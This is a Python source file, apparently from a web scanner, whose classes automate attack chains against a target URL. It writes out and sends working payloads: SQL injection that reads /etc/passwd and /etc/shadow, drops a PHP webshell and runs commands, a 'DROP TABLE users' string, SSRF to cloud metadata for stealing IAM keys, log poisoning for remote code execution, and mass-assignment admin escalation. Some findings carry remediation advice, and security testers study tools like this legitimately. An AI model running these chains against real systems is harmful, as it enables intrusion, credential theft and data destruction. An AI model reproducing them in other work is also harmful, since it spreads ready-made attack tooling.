class ChainedExploitOrchestrator:
    """
    Orchestrates multi-step chained exploit sequences.
    Each chain is a list of steps where the output of one feeds the next.

    Built-in chains:
    - sqli_to_rce:    SQLi → file write → OS command execution
    - ssrf_to_cloud:  SSRF → metadata endpoint → credential theft
    - idor_to_takeover: IDOR → account enumeration → account takeover
    - xss_to_csrf:    Stored XSS → CSRF action → privilege escalation
    - lfi_to_rce:     LFI → log poisoning → RCE via log inclusion

    Usage
    -----
    orch = ChainedExploitOrchestrator(client)
    results = await orch.run_chain("sqli_to_rce", target_url, params)
    """

    BUILTIN_CHAINS = {
        "sqli_to_rce": [
            {
                "name":    "step1_detect_sqli",
                "desc":    "Detect SQL injection entry point",
                "payloads": [
                    "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
                    "1; DROP TABLE users--",
                ],
                "indicator": ["sql", "syntax", "mysql", "ora-", "unclosed"],
            },
            {
                "name":    "step2_read_file",
                "desc":    "Use SQLi to read sensitive files",
                "payloads": [
                    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
                    "' UNION SELECT LOAD_FILE('/etc/shadow')--",
                    "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
                ],
                "indicator": ["root:", "daemon:", "nobody:"],
            },
            {
                "name":    "step3_write_webshell",
                "desc":    "Write PHP webshell via SQLi",
                "payloads": [
                    "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' "
                    "INTO OUTFILE '/var/www/html/ws.php'--",
                ],
                "indicator": ["200", "query ok"],
            },
            {
                "name":    "step4_execute_command",
                "desc":    "Execute OS command via dropped webshell",
                "payloads": ["?cmd=id", "?cmd=whoami", "?cmd=cat+/etc/passwd"],
                "indicator": ["uid=", "root", "www-data"],
            },
        ],
        "ssrf_to_cloud": [
            {
                "name":    "step1_detect_ssrf",
                "desc":    "Detect SSRF entry point",
                "payloads": [
                    "http://169.254.169.254/",
                    "http://metadata.google.internal/",
                    "http://169.254.169.254/latest/meta-data/",
                ],
                "indicator": ["ami-", "instance-id", "metadata", "computeMetadata"],
            },
            {
                "name":    "step2_steal_iam",
                "desc":    "Steal IAM credentials via IMDS",
                "payloads": [
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default",
                ],
                "indicator": ["AccessKeyId", "SecretAccessKey", "Token"],
            },
        ],
        "idor_to_takeover": [
            {
                "name":    "step1_enumerate_ids",
                "desc":    "Enumerate user IDs via IDOR",
                "payloads": [str(i) for i in range(1, 21)],
                "indicator": ["email", "username", "user_id", "account"],
            },
            {
                "name":    "step2_extract_email",
                "desc":    "Extract account emails",
                "payloads": ["?id=1", "?user_id=1", "?account=1"],
                "indicator": ["@", ".com", "email"],
            },
            {
                "name":    "step3_password_reset",
                "desc":    "Trigger password reset for victim account",
                "payloads": ["email=victim@example.com"],
                "indicator": ["reset", "link sent", "check your email"],
            },
        ],
        "lfi_to_rce": [
            {
                "name":    "step1_detect_lfi",
                "desc":    "Detect Local File Inclusion",
                "payloads": [
                    "../../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                ],
                "indicator": ["root:", "daemon:", "nobody:"],
            },
            {
                "name":    "step2_poison_log",
                "desc":    "Poison Apache/Nginx access log with PHP code",
                "payloads": [
                    "<?php system($_GET['c']); ?>",
                ],
                "indicator": ["200", "ok"],
                "inject_header": "User-Agent",
            },
            {
                "name":    "step3_include_log",
                "desc":    "Include the poisoned log file",
                "payloads": [
                    "../../../../var/log/apache2/access.log&c=id",
                    "../../../../var/log/nginx/access.log&c=id",
                ],
                "indicator": ["uid=", "root", "www-data"],
            },
        ],
    }

    def __init__(self, client: "WebScoutClient"):
        self._client  = client
        self._results: list[dict] = []

    async def run_chain(
        self,
        chain_name: str,
        base_url:   str,
        params:     dict | None = None,
    ) -> list[dict]:
        """Run a named exploit chain and return step-by-step results."""
        chain = self.BUILTIN_CHAINS.get(chain_name)
        if not chain:
            raise ValueError(f"Unknown chain: {chain_name}. "
                             f"Available: {list(self.BUILTIN_CHAINS)}")

        log("INFO", f"[ChainOrchestrator] Starting chain '{chain_name}' on {base_url}")
        step_results: list[dict] = []
        context: dict = {}   # carries forward data between steps

        for step in chain:
            step_result = await self._run_step(step, base_url, params, context)
            step_results.append(step_result)
            if not step_result.get("success"):
                log("INFO",
                    f"[Chain:{chain_name}] Step '{step['name']}' failed — chain halted.")
                break
            context.update(step_result.get("extracted", {}))
            log("VULN" if step_result.get("success") else "INFO",
                f"[Chain:{chain_name}] {step['desc']} — "
                f"{'CONFIRMED' if step_result['success'] else 'FAILED'}")

        self._results.extend(step_results)
        return step_results

    async def _run_step(
        self,
        step:     dict,
        base_url: str,
        params:   dict | None,
        context:  dict,
    ) -> dict:
        indicators = step.get("indicator", [])
        inject_header = step.get("inject_header")

        for payload in step.get("payloads", []):
            try:
                if inject_header:
                    resp_text, status = await self._send_with_header(
                        base_url, inject_header, payload
                    )
                elif params:
                    resp_text, status = await self._send_with_params(
                        base_url, params, payload
                    )
                else:
                    url = base_url.rstrip("/") + "/" + payload.lstrip("/")
                    resp_text, status = await self._send_get(url)

                hit = any(ind.lower() in resp_text.lower() for ind in indicators)
                if hit:
                    extracted = self._extract_values(resp_text, indicators)
                    return {
                        "step":      step["name"],
                        "desc":      step["desc"],
                        "success":   True,
                        "payload":   payload,
                        "status":    status,
                        "extracted": extracted,
                        "snippet":   resp_text[:300],
                    }
            except Exception as exc:
                log("WARN", f"[ChainStep] {step['name']}: {exc}")
                continue

        return {
            "step":    step["name"],
            "desc":    step["desc"],
            "success": False,
            "payload": None,
        }

    async def _send_get(self, url: str) -> tuple[str, int]:
        async with self._client._sess.get(
            url, timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            return await r.text(errors="replace"), r.status

    async def _send_with_params(
        self, base_url: str, params: dict, payload: str
    ) -> tuple[str, int]:
        mutated = {k: payload for k in params}
        async with self._client._sess.get(
            base_url, params=mutated,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            return await r.text(errors="replace"), r.status

    async def _send_with_header(
        self, url: str, header: str, payload: str
    ) -> tuple[str, int]:
        async with self._client._sess.get(
            url, headers={header: payload},
            timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            return await r.text(errors="replace"), r.status

    @staticmethod
    def _extract_values(text: str, indicators: list[str]) -> dict:
        extracted: dict = {}
        for ind in indicators:
            idx = text.lower().find(ind.lower())
            if idx != -1:
                extracted[ind] = text[idx: idx + 120].strip()
        return extracted

    def list_chains(self) -> list[str]:
        return list(self.BUILTIN_CHAINS)


class RaceConditionOrchestrator:
    """
    Advanced race condition engine.
    Supports multiple strategies: asyncio burst, thread burst, timing analysis.

    Usage
    -----
    rc = RaceConditionOrchestrator(client)
    result = await rc.test(
        url        = "https://target.com/api/redeem",
        method     = "POST",
        body       = {"coupon": "SAVE50"},
        threads    = 50,
        window_ms  = 100,
    )
    """

    def __init__(self, client: "WebScoutClient"):
        self._client = client

    async def test(
        self,
        url:       str,
        method:    str = "POST",
        body:      dict | None = None,
        headers:   dict | None = None,
        threads:   int = 30,
        window_ms: float = 50.0,
        success_indicators: list[str] | None = None,
    ) -> dict:
        """
        Fire `threads` identical requests within `window_ms` milliseconds.
        Returns analysis of responses for race condition indicators.
        """
        success_ind = success_indicators or [
            "success", "redeemed", "applied", "discount", "accepted",
            "200", "credited", "bonus", "reward",
        ]

        tasks: list = []
        barrier = asyncio.Barrier(threads)

        async def _fire() -> dict:
            await barrier.wait()   # synchronize start
            t0 = time.monotonic()
            try:
                async with self._client._sess.request(
                    method, url, json=body, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=15),
                ) as resp:
                    text = await resp.text(errors="replace")
                    return {
                        "status":  resp.status,
                        "text":    text[:512],
                        "elapsed": time.monotonic() - t0,
                        "success": any(ind.lower() in text.lower()
                                      for ind in success_ind),
                    }
            except Exception as exc:
                return {
                    "status": -1, "text": str(exc),
                    "elapsed": time.monotonic() - t0, "success": False,
                }

        tasks = [asyncio.create_task(_fire()) for _ in range(threads)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        responses = [r for r in responses if isinstance(r, dict)]

        successes = [r for r in responses if r.get("success")]
        status_counts: dict = defaultdict(int)
        for r in responses:
            status_counts[r["status"]] += 1

        timing_values = [r["elapsed"] for r in responses]
        avg_timing = sum(timing_values) / len(timing_values) if timing_values else 0
        min_timing = min(timing_values) if timing_values else 0
        max_timing = max(timing_values) if timing_values else 0

        race_detected = (
            len(successes) > 1 or
            (len(set(r["status"] for r in responses)) > 2) or
            (max_timing - min_timing > 3.0)
        )

        return {
            "race_detected":   race_detected,
            "total_requests":  len(responses),
            "success_count":   len(successes),
            "status_counts":   dict(status_counts),
            "avg_timing_s":    round(avg_timing, 3),
            "timing_spread_s": round(max_timing - min_timing, 3),
            "sample_responses": [r["text"][:200] for r in successes[:3]],
        }


class BusinessLogicOrchestrator:
    """
    Orchestrates complex business logic attack flows.
    Goes beyond individual parameter tampering to chain business steps.

    Attack flows:
    - negative_quantity:    order with qty=-1 to get credit
    - zero_price:           set price to 0.00 or 0.001
    - coupon_stacking:      apply same coupon multiple times
    - workflow_skip:        jump from step 1 directly to step 5
    - privilege_escalation: change role to admin via mass assignment
    - refund_abuse:         refund after consuming digital goods

    Usage
    -----
    blo = BusinessLogicOrchestrator(client)
    findings = await blo.run_all(base_url, discovered_endpoints)
    """

    def __init__(self, client: "WebScoutClient"):
        self._client   = client
        self._findings: list[Finding] = []

    async def run_all(
        self,
        base_url:   str,
        endpoints:  list[dict] | None = None,
    ) -> list[Finding]:
        """Run all business logic attack flows."""
        guard = CrashGuard()
        flows = [
            self._negative_quantity(base_url),
            self._zero_price(base_url),
            self._coupon_stacking(base_url),
            self._workflow_skip(base_url),
            self._privilege_escalation(base_url),
            self._refund_abuse(base_url),
        ]
        for flow_coro in flows:
            async with guard.protect("BusinessLogicOrchestrator"):
                new_findings = await flow_coro
                self._findings.extend(new_findings)
        return self._findings

    async def _negative_quantity(self, base_url: str) -> list[Finding]:
        """Try ordering with negative quantity."""
        findings: list[Finding] = []
        test_payloads = [-1, -100, -999, 0, 0.001]
        endpoints = ["/api/cart", "/api/order", "/checkout", "/cart/add"]
        for ep in endpoints:
            url = base_url.rstrip("/") + ep
            for qty in test_payloads:
                try:
                    async with self._client._sess.post(
                        url, json={"quantity": qty, "qty": qty},
                        timeout=aiohttp.ClientTimeout(total=8),
                    ) as resp:
                        text = await resp.text(errors="replace")
                        if any(ind in text.lower() for ind in SUCCESS_IND):
                            findings.append(Finding(
                                vuln_type="Business Logic — Negative Quantity",
                                url=url,
                                severity="HIGH",
                                confidence=85,
                                description=(
                                    f"Server accepted order with quantity={qty}. "
                                    "Attacker may receive a refund or credit by "
                                    "ordering negative quantities."
                                ),
                                remediation=(
                                    "Validate quantity server-side: must be positive integer. "
                                    "Reject zero, negative, and non-integer values."
                                ),
                                evidence=text[:300],
                                cwe="CWE-840",
                                cvss=7.5,
                                owasp="A04",
                                poc=f"POST {ep} {{\"quantity\": {qty}}}",
                                tags=["business-logic", "negative-qty"],
                            ))
                except Exception:
                    pass
        return findings

    async def _zero_price(self, base_url: str) -> list[Finding]:
        """Try setting price to zero or near-zero."""
        findings: list[Finding] = []
        endpoints = ["/api/checkout", "/api/order", "/api/cart/update",
                     "/purchase", "/buy"]
        for ep in endpoints:
            url = base_url.rstrip("/") + ep
            for price in [0, 0.001, -0.01, 0.00]:
                try:
                    async with self._client._sess.post(
                        url, json={"price": price, "amount": price,
                                   "total": price, "cost": price},
                        timeout=aiohttp.ClientTimeout(total=8),
                    ) as resp:
                        text = await resp.text(errors="replace")
                        if any(ind in text.lower() for ind in SUCCESS_IND):
                            findings.append(Finding(
                                vuln_type="Business Logic — Price Manipulation",
                                url=url,
                                severity="CRITICAL",
                                confidence=90,
                                description=(
                                    f"Server accepted purchase with price={price}. "
                                    "Attacker can acquire goods/services for free."
                                ),
                                remediation=(
                                    "Never trust client-supplied price values. "
                                    "Always recalculate price server-side from product catalog."
                                ),
                                evidence=text[:300],
                                cwe="CWE-840",
                                cvss=9.1,
                                owasp="A04",
                                poc=f"POST {ep} {{\"price\": {price}}}",
                                tags=["business-logic", "price-manipulation"],
                            ))
                except Exception:
                    pass
        return findings

    async def _coupon_stacking(self, base_url: str) -> list[Finding]:
        """Apply the same coupon multiple times."""
        findings: list[Finding] = []
        endpoints = ["/api/coupon/apply", "/discount/apply",
                     "/promo/redeem", "/voucher/use"]
        test_coupon = "SAVE10"
        for ep in endpoints:
            url = base_url.rstrip("/") + ep
            successes = 0
            for _ in range(3):
                try:
                    async with self._client._sess.post(
                        url,
                        json={"coupon": test_coupon, "code": test_coupon,
                              "promo_code": test_coupon},
                        timeout=aiohttp.ClientTimeout(total=8),
                    ) as resp:
                        text = await resp.text(errors="replace")
                        if resp.status in (200, 201) and any(
                            ind in text.lower() for ind in SUCCESS_IND
                        ):
                            successes += 1
                except Exception:
                    pass
            if successes > 1:
                findings.append(Finding(
                    vuln_type="Business Logic — Coupon Stacking",
                    url=url,
                    severity="HIGH",
                    confidence=80,
                    description=(
                        f"Coupon '{test_coupon}' was accepted {successes} times "
                        "in the same session, allowing discount stacking."
                    ),
                    remediation=(
                        "Track coupon usage server-side per session/user/order. "
                        "Invalidate coupon immediately after first application."
                    ),
                    cwe="CWE-840",
                    cvss=7.0,
                    owasp="A04",
                    poc=f"POST {ep} {{\"coupon\": \"{test_coupon}\"}} (repeated {successes}x)",
                    tags=["business-logic", "coupon-stacking"],
                ))
        return findings

    async def _workflow_skip(self, base_url: str) -> list[Finding]:
        """Try accessing later workflow steps without completing earlier ones."""
        findings: list[Finding] = []
        workflows = [
            ["/checkout/step1", "/checkout/step2",
             "/checkout/step3", "/checkout/confirm"],
            ["/order/payment", "/order/confirm"],
            ["/register/step1", "/register/step2",
             "/register/complete"],
        ]
        for flow in workflows:
            last_step = base_url.rstrip("/") + flow[-1]
            try:
                async with self._client._sess.get(
                    last_step, timeout=aiohttp.ClientTimeout(total=8)
                ) as resp:
                    text = await resp.text(errors="replace")
                    if resp.status == 200 and any(
                        ind in text.lower()
                        for ind in ["confirm", "complete", "success",
                                    "order", "thank you"]
                    ):
                        findings.append(Finding(
                            vuln_type="Business Logic — Workflow Step Skip",
                            url=last_step,
                            severity="HIGH",
                            confidence=75,
                            description=(
                                f"Accessed final workflow step '{flow[-1]}' without "
                                "completing prior steps. Workflow enforcement is missing."
                            ),
                            remediation=(
                                "Implement server-side workflow state tracking. "
                                "Validate that all prerequisite steps are completed "
                                "before allowing access to later steps."
                            ),
                            cwe="CWE-285",
                            cvss=7.5,
                            owasp="A01",
                            poc=f"GET {flow[-1]} (skipping {', '.join(flow[:-1])})",
                            tags=["business-logic", "workflow-skip"],
                        ))
            except Exception:
                pass
        return findings

    async def _privilege_escalation(self, base_url: str) -> list[Finding]:
        """Attempt privilege escalation via mass assignment."""
        findings: list[Finding] = []
        endpoints = ["/api/user/update", "/api/profile", "/user/settings",
                     "/account/update"]
        priv_payloads = [
            {"is_admin": True, "role": "admin"},
            {"admin": 1, "is_superuser": True},
            {"privilege": "superuser", "access_level": 99},
            {"account_type": "admin", "is_staff": True},
        ]
        for ep in endpoints:
            url = base_url.rstrip("/") + ep
            for payload in priv_payloads:
                try:
                    async with self._client._sess.post(
                        url, json=payload,
                        timeout=aiohttp.ClientTimeout(total=8),
                    ) as resp:
                        text = await resp.text(errors="replace")
                        if resp.status in (200, 201) and not any(
                            err in text.lower() for err in ERROR_IND
                        ):
                            findings.append(Finding(
                                vuln_type="Business Logic — Mass Assignment Privesc",
                                url=url,
                                severity="CRITICAL",
                                confidence=80,
                                description=(
                                    f"Server accepted privilege escalation payload: "
                                    f"{payload}. Account may have been promoted to admin."
                                ),
                                remediation=(
                                    "Use explicit allowlists for accepted fields. "
                                    "Never bind request body directly to user model. "
                                    "Validate role/privilege changes server-side."
                                ),
                                evidence=text[:300],
                                cwe="CWE-915",
                                cvss=9.8,
                                owasp="A01",
                                poc=f"POST {ep} {json.dumps(payload)}",
                                tags=["mass-assignment", "privilege-escalation"],
                            ))
                            break
                except Exception:
                    pass
        return findings

    async def _refund_abuse(self, base_url: str) -> list[Finding]:
        """Check for refund after digital good consumption."""
        findings: list[Finding] = []
        endpoints = ["/api/refund", "/order/refund", "/purchase/refund"]
        for ep in endpoints:
            url = base_url.rstrip("/") + ep
            try:
                async with self._client._sess.post(
                    url,
                    json={"order_id": 1, "reason": "not_satisfied",
                          "order_status": "delivered"},
                    timeout=aiohttp.ClientTimeout(total=8),
                ) as resp:
                    text = await resp.text(errors="replace")
                    if resp.status in (200, 201) and any(
                        ind in text.lower()
                        for ind in ["refund", "credited", "returned", "issued"]
                    ):
                        findings.append(Finding(
                            vuln_type="Business Logic — Refund Abuse",
                            url=url,
                            severity="HIGH",
                            confidence=70,
                            description=(
                                "Refund endpoint accepted request without validating "
                                "delivery status. Digital goods may be claimable after refund."
                            ),
                            remediation=(
                                "Check delivery/download status before issuing refunds. "
                                "Revoke digital goods access upon refund initiation."
                            ),
                            cwe="CWE-840",
                            cvss=7.5,
                            owasp="A04",
                            poc=f"POST {ep} {{\"order_id\": 1, \"order_status\": \"delivered\"}}",
                            tags=["business-logic", "refund-abuse"],
                        ))
            except Exception:
                pass
        return findings


